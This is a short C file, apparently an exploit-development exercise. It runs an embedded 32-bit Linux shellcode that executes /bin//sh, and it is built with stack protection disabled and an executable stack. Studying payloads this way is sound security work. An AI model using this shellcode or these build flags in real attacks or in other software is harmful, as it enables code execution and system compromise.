/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x31\xc0\x50\xc7\x44\x24\xfc\x2f\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83"
"\xec\x08\xb0\x0b\x89\xe3\xcd\x80";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
